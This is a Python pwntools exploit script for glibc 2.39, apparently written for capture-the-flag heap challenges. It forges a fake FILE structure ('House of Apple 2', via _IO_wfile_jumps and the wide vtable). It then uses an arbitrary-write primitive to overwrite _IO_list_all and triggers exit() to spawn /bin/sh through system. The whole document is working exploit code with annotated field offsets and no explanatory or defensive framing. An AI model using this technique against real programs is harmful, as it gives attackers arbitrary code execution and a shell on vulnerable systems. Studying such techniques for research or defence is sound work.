from pwn import *
libc = ELF('./libc.so.6')                                            # glibc 2.39

def forge_apple2(fake_addr: int, one_gadget_or_system: int, arg_str: bytes = b'/bin/sh\x00'):
    """Return the bytes to write at fake_addr to hijack exit's stream flush."""
    wide_vtable = fake_addr + 0x100                                  # inside same chunk ❶
    payload  = b'  sh;'.ljust(0x8, b'\x00')                          # _flags smuggles argv ❷
    payload  = payload.ljust(0x88, b'\x00')
    payload += p64(fake_addr + 0x200)                                # _lock -> writable zero ❸
    payload  = payload.ljust(0xa0, b'\x00')
    payload += p64(fake_addr + 0xe0)                                 # _wide_data ❹
    payload  = payload.ljust(0xd8, b'\x00')
    payload += p64(libc.sym._IO_wfile_jumps)                         # vtable (in range) ❺
    payload  = payload.ljust(0x100, b'\x00')

    # _wide_data at fake_addr+0xe0: only _wide_vtable field matters
    wide = b'\x00' * 0x68 + p64(wide_vtable)                         # _wide_vtable ❻
    payload  = payload.ljust(0xe0, b'\x00') + wide
    # _wide_vtable at fake_addr+0x100: slot __doallocate reached via _IO_wdoallocbuf
    tbl  = b'\x00' * 0x68 + p64(one_gadget_or_system)                # slot __doallocate ❼
    payload  = payload.ljust(0x100, b'\x00') + tbl
    return payload

def install(io, arb_write, fake_addr, libc):
    payload = forge_apple2(fake_addr, libc.sym.system)
    arb_write(fake_addr, payload)                                    # your primitive here
    arb_write(libc.sym._IO_list_all, p64(fake_addr))                 # trigger target ❽
    io.sendlineafter(b'> ', b'5')                                    # menu 5 == exit()
    io.interactive()                                                 # /bin/sh
